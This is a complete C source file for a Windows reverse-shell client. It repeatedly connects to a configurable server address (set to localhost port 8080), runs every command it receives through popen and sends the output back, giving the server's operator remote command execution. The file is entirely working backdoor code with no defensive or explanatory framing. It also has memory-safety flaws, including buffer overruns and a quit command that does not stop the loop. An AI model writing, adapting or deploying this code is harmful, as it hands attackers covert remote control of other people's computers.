#include <stdio.h>
#include <winsock2.h>
#include <pthread.h>
#include <windows.h>

#define HOST "127.0.0.1"
#define PORT 8080

#pragma comment(lib, "ws2_32.lib") // Linking the socket library

void handleError(char message[]) {
    printf("[ERROR (%d)] in %s\n", WSAGetLastError(), message);
}

char* getCmdData(char cmd[]) {
    FILE *fp;
    char buffer[1024];
    char* data = malloc(4096 * sizeof(char));
    data[0] = '\0'; // Initialize the string to be empty

    fp = popen(cmd, "r");

    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        strcat(data, buffer);
    }

    pclose(fp);

    return data;
}


int main() {

    WSADATA wsa;
    struct sockaddr_in server;
    char chunks[2000];

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
    {
        handleError("initialising winsock");
        return 1;
    }

    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET)
    {
        handleError("creating socket");
    }

    server.sin_addr.s_addr = inet_addr(HOST);
    server.sin_port = htons(PORT);
    server.sin_family = AF_INET;
    memset(&(server.sin_zero), 0, sizeof(server));

    int connectedToServer = 0;

    do {
        if (connect(s, (const struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
            handleError("connecting to server");
        } else {
            connectedToServer = 1;
            break;
        }
        Sleep(1000);
    } while (connectedToServer != 1);

    int recv_chunks;
    while ((recv_chunks = recv(s, chunks, 2000, 0)) > 0) {
        chunks[recv_chunks] = '\0';
        if (strcmp(chunks, "!quit") == 0) {
            closesocket(s);
        }

        char* output = getCmdData(chunks);

        int result = send(s, output, strlen(output), 0);
        if (result == SOCKET_ERROR) {
            handleError("sending output to server");
            continue;
        }
    }

    if (recv_chunks == SOCKET_ERROR)
    {
        handleError("receiving data from server");
    }

    return 0;
}
